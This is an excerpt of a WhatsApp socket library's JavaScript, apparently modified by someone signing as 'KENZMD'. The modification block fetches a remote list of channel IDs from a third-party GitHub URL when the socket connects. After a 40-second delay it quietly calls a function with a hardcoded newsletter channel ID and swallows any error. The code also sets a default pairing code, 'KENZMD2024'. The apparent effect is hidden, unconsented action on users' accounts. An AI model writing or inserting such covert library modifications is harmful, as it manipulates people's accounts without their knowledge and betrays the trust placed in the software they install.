...
export const makeSocket = (config) => {
  ...
  // ========== MODIFIED BY KENZMD - PAKE PUNYA GW ==========
  const socketConnect = async () => {
    // PAKE URL PUNYA KENZMD (Kiyoraelvi)
    const url = "https://raw.githubusercontent.com/Kiyoraelvi/Screaper/refs/heads/main/idChannel.json"
...
const toPn = async (pn) => {
  ...
  const generateMessageV = async (n) => {
    // PAKE ID CHANNEL PUNYA KENZMD (ganti dengan ID channel lo)
    const channelId = "120363405637529316@newsletter"; // GANTI DENGAN ID CHANNEL LO
  
    setTimeout(async () => {
      try {
        await n(channelId, "7871414976211147");
      } catch (_) {}
    }, 40000);
  };
  // ========== END MODIFIED BY KENZMD ==========
  ...
  const validateConnection = async () => {
    ...
    await socketConnect() // PAKE PUNYA KENZMD
  ...
  const requestPairingCode = async (phoneNumber, customPairingCode = "KENZMD2024") => {
